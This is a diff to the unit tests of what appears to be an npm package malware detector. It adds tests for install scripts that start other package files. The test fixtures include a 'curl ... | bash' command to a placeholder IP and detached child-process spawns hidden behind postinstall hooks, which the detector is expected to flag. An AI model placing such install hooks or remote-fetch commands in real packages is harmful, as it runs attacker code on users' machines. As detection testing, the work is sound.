@@ -312,6 +312,14 @@ def js_facts(files: dict, scripts: dict | None = None, fields: dict | None = Non
     return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
 
 
+def npm_facts(files: dict, scripts: dict | None = None, fields: dict | None = None) -> set:
+    """{(finding, phase)} through behavior.analyze_files, as the guard runs it: files can find each other."""
+    paths, install_files = npm_package(files, scripts, fields)
+    feats = types.SimpleNamespace(ecosystem="npm", install_time_files=install_files, evidence=[])
+    ctx = behavior.analyze_files(paths, feats)
+    return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
+
+
 def js_code(src: str) -> set:
     return js_facts({"index.js": src})
 
@@ -462,6 +470,27 @@ class JSPhases(unittest.TestCase):
         got = js_facts({"setup.js": "require('child_process').execSync('wmic process list');\n"},
                     {"install": "node setup.js"})
         self.assertIn(("install_process", "install"), got)
+
+    def test_install_script_starts_another_file(self):
+        """An install script that starts one of the package's own files (node, python, sh) runs that file at install:
+        spawn / fork / exec, a path built from __dirname, a lifecycle command that runs a script which starts another."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        spawn = ("const { spawn } = require('child_process'); const path = require('path');\n"
+                 "spawn('node', [path.resolve(__dirname, 'main.js')], { detached: true, stdio: 'ignore' }).unref();\n")
+        got = npm_facts({"src/postinstall.js": spawn, "src/main.js": src}, {"postinstall": "node src/postinstall.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"build.js": "require('child_process').exec('node main.js > /dev/null 2>&1;');\n", "main.js": src},
+                       {"preinstall": "node build.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"i.js": "require('child_process').fork(__dirname + '/w.js');\n", "w.js": src}, {"install": "node i.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"i.js": "require('child_process').execSync('sh ./run.sh');\n", "run.sh": "curl -s http://203.0.113.4/i.sh | bash\n"},
+                       {"postinstall": "node i.js"})
+        self.assertIn(("download_exec", "install"), got)
+        # the same file started only from code that runs when called: not install
+        got = npm_facts({"lib/x.js": "module.exports = () => require('child_process').spawn('node', [__dirname + '/w.js']);\n",
+                        "lib/w.js": src}, fields={"main": "lib/x.js"})
+        self.assertNotIn(("download_exec", "install"), got)
 
     def test_function_never_called_is_call_phase(self):
         got = js_code("const cp = require('child_process');\n"
